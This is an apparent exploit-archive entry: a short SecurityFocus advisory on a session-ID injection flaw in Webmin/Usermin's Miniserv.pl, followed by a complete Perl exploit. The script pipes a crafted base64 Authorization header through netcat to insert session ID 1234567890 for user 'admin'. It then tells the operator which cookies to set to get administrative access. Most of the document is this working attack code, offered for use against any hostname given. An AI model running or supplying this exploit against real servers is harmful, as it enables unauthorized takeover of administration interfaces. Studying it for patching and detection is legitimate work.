source: http://www.securityfocus.com/bid/6915/info

A vulnerability has been discovered in the 'Miniserv.pl' script used to invoke both Webmin and Usermin. Due to insufficient sanitization of client-supplied BASE64 encoded input, it is possible to inject a Session ID into the access control list.

Successful exploitation of this vulnerability may allow an attacker to bypass typical authentication procedures, thus gaining adminstrative access to a webmin/usermin interface. 


#!/usr/bin/perl
#
# Exploit for Webmin 1.050 -> 1.060 by Carl Livitt
#
# Inserts a fake session_id into the sessions list of webmin.
# Does no error checking... if remote host is not found, no
# error will be reported.
#

print "Webmin 1.050 - 1.060 Remote SID Injection Exploit\n";
print "By Carl Livitt <carl at learningshophull dot co dot uk>\n\n";

$nc="/usr/bin/netcat";

if($#ARGV == -1) {
	print "Syntax:\n\t$0 hostname\n";
	exit(1);
}

$hostname=$ARGV[0];

if ( ! -x $nc ) {
	print "netcat not found!\n";
	exit(2);
}

open(NC, "|$nc $hostname 10000 >& /dev/null");
print NC "GET / HTTP/1.1\n";
print NC "Host: $hostname\n";
print NC "User-agent: webmin\n";
print NC "Authorization: Basic YSBhIDEKbmV3IDEyMzQ1Njc4OTAgYWRtaW46cGFzc3dvcmQ=\n\n";
close(NC);

print "You should now have a session_id of 1234567890 for user 'admin' on host $hostname.\n";
print "Just set two cookies in your browser:\n\ttesting=1\n\tsid=1234567890\nand you will ";
print "be authenticated to the webmin server!\n\n";
print "Note: This will only work on a webmin server configured with the 'passdelay' option.\n";